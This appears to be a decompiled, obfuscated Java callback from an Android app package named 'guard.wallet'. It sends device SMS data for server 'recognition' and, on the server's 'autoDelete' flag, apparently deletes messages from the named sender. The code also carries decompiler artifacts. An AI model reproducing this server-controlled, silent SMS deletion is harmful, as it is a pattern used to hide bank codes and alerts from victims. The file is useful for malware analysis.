package com.guard.wallet.http;

import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.SmsRecognizeRespVO;
import java.io.IOException;
import p0.j0;
import p0.l0;

public final class f implements p0.e {
   @Override
   public final void b(p0.e0 var1, IOException var2) {
      a1.q.s("DeviceSmsRecognizeCallback", var2);
      if (!(var2 instanceof s.b)) {
         i.c(var1.c.a.h);
         l.x(var1, this);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void d(p0.e0 var1, j0 var2) {
      i.c(var1.c.a.h);
      l0 var6 = var2.g;
      label35:
      if (var6 != null) {
         Exception var10000;
         label37: {
            try {
               DeviceSmsRecognizeCallback$1 var3 = new DeviceSmsRecognizeCallback$1();
               var7 = (ApiResult)com.guard.wallet.utils.h.c(var6.z(), var3);
            } catch (Exception var5) {
               var10000 = var5;
               boolean var10001 = false;
               break label37;
            }

            if (var7 == null) {
               break label35;
            }

            try {
               if (var7.getSuccess() && var7.getData() != null) {
                  SmsRecognizeRespVO var9 = (SmsRecognizeRespVO)var7.getData();
                  if (var9.getResp() && var9.getAutoDelete() && !a1.q.B(var9.getSender())) {
                     com.guard.wallet.utils.g.A(var9.getSender());
                  }
               }
               break label35;
            } catch (Exception var4) {
               var10000 = var4;
               boolean var10 = false;
            }
         }

         Exception var8 = var10000;
         a1.q.s("DeviceSmsRecognizeCallback", var8);
      }

      var2.close();
   }
}
